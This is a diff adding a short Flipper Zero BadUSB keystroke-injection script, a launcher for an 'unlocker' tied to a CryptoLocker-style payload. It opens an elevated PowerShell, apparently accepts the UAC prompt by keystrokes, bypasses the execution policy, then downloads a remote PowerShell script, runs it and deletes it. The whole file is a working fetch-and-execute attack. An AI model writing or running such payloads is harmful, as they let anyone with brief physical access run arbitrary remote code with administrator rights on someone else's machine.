@@ -1,0 +1,13 @@
+REM Flip-CryptoUnlocker Launcher
+REM Author: ooovenenoso
+DELAY 2000
+GUI x
+DELAY 2000
+STRING a
+DELAY 2000
+LEFTARROW
+DELAY 2000
+ENTER
+DELAY 4000
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ooovenenoso/Flipper-Zero-BadUSB/main/Payloads/Flip-CryptoLocker/Flip-CryptoUnlocker.ps1' -OutFile "$env:USERPROFILE\Desktop\Flip-CryptoUnlocker.ps1"; & "$env:USERPROFILE\Desktop\Flip-CryptoUnlocker.ps1"; Remove-Item "$env:USERPROFILE\Desktop\Flip-CryptoUnlocker.ps1" -Force
+ENTER
